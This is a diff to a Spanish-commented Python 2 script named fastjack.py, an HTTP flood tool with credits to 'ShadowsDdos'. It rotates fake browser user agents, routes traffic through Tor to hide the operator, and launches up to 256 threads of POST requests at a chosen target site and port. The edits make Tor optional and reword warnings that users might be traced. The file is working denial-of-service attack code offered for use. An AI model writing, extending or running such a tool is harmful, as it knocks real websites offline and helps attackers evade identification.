@@ -1,7 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 # agradecimientos a ShadowsDdos
-
 import click    
 import os
 import re
@@ -24,10 +23,8 @@ import json
 
 global stop_now
 global term
-
 stop_now = False
 term = terminal.TerminalController()
-
 
 useragents = [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
@@ -129,6 +126,7 @@ def usage():
     print " -T / --tor: Enable anonymising through tor on 127.0.0.1:9050"
     print " -h : Muestra esta Ayuda\n" 
     print Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com" + Style.RESET_ALL
+    print Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com -T" + Style.RESET_ALL
     print Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com -r 256 -p 80" + Style.RESET_ALL
     print "\n"
 
@@ -137,28 +135,23 @@ if tor is True:
     ipcheck_url = 'http://canihazip.com/s'
     socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050) 
     socket.socket = socks.socksocket
-
     try:       
         tor_ip = requests.get(ipcheck_url) 
         tor_ip = str(tor_ip.text) 
-
     except requests.exceptions.RequestException as e:
         sys.exit(0)
 
 def main(argv):
-
     try:
         opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
     except getopt.GetoptError:
         usage() 
         sys.exit(-1)
-
     global stop_now
-
     target = ''	
     threads = 256
-################## cambie tor = True por False para desactivar auto conexion a Tor.
-    tor = True
+################## Cambia tor = False por True para dejar permanente la conexion TOR.
+    tor = False
 ##################
     port = 80
 
@@ -185,23 +178,26 @@ def main(argv):
     if tor is True:
         print Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.GREEN + "Activada" + Style.RESET_ALL
         print Fore.GREEN + Style.BRIGHT + "Nueva Conexion IP-TOR: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + tor_ip + Style.RESET_ALL
+        torstatus = "-T"
 
     if tor is False:
         print Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.RED + "Desactivado"+ Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " o " + Style.RESET_ALL + Back.RED + "NO Encontrada" + Style.RESET_ALL
         ipcheck_url2 = 'http://canihazip.com/s' 
+        torstatus = "-F"
         try:
             regular_ip = requests.get(ipcheck_url2) 
             regular_ip = str(regular_ip.text) 
             print Fore.GREEN + Style.BRIGHT + "Tu IP Externo es: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + regular_ip + Style.RESET_ALL
-            print Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + "Utilice siempre una conexion VPN..." + Style.RESET_ALL
-            print Fore.YELLOW + Style.BRIGHT + "Si usted no cuenta con VPN y/o TOR" + Style.RESET_ALL
-            print Fore.YELLOW + Style.BRIGHT + "NO se arriesgue y NO utilice este progrema." + Style.RESET_ALL
-            print Fore.YELLOW + Style.BRIGHT + "Sin una proteccion adecuada, su ubicacion podria ser rastreada.." + Style.RESET_ALL
+            print Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + "Utilice siempre una conexion VPN, o su ubicacion podria ser rastreada.." + Style.RESET_ALL
+            print Fore.YELLOW + Style.BRIGHT + "Si usted cuenta con TOR NETWORK:" + Style.RESET_ALL
+            print Fore.WHITE + Style.BRIGHT + "Vea el siguiente ejemplo para Activarlo." + Style.RESET_ALL
+            print Fore.RED + Style.BRIGHT + "Ej: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "python fastjack -t <web> -T" + Style.RESET_ALL
             click.confirm('..................... ' +Back.RED + Fore.GREEN + Style.BRIGHT +'Quieres Continuar?' + Style.RESET_ALL, abort=True)
         except requests.exceptions.RequestException as e:
             sys.exit(0)
 ############################### SI usted no usa Gnome Terminal agrege un # a la linea de abajo. Gato o HashTag 
-    os.system("gnome-terminal -- python hostjack-checker.py " + target)
+############################### La siguiente linea Activa o Descativa HostJack-Checker
+    os.system("gnome-terminal -- python hostjack-checker.py " + target + " " + torstatus)
 ###############################
     print Back.CYAN +  Style.BRIGHT + "Verificando Estado del Servidor" + Style.RESET_ALL
     resultado = check_url("http://" + target)
@@ -218,7 +214,6 @@ def main(argv):
        click.confirm('..................... ' +Back.RED + Fore.GREEN + Style.BRIGHT +'Quieres Continuar?' + Style.RESET_ALL, abort=True)
     print Back.GREEN + Style.BRIGHT + "Objetivo:" + Style.RESET_ALL + Back.RED +  " %s " % (target) + Style.RESET_ALL + Back.GREEN + "Puerto:" + Style.RESET_ALL + Back.RED + " %d " % (port) + Style.RESET_ALL
     print Back.GREEN + Style.BRIGHT + " * Clientes:" + Style.RESET_ALL + Back.RED + " %d " % (threads) + Style.RESET_ALL
-
     rthreads = []
     for i in range(threads):
         t = httpPost(target, port, tor)
